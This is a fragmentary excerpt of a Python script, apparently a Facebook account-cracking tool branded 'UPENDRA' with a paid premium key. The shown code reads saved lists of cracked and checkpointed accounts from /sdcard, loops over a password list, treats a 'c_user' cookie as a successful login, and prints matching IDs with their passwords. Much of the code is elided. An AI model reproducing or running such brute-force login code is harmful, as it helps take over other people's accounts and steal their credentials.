                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public_mai()                      
                                ...
                                os.system(f'xdg-open https://www.facebook.com/UPENDRAxwd');menu()
                                ...
                                if cpok in ['1','01']:
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/UPENDRA-OK.txt', 'a')
                                    animation(' >> Opening UPENDRA-OK.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/UPENDRA-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/UPENDRA-CP.txt', 'a')
                                    animation(' >> Opening UPENDRA-CP.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/UPENDRA-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
                                        animation('\u001b[33m'+cpid);
                                        cpids.close()
                                    print('\033[1;37m----------------------------------------------')
                        ...
                        tks = ("Hi HARRY Sir, I Need To Buy Your Paid UPENDRA PRO Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in HARRY:
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\u001b[33m [UPENDRA-CP] '+ids+' | '+pas+'\033[1;97m')
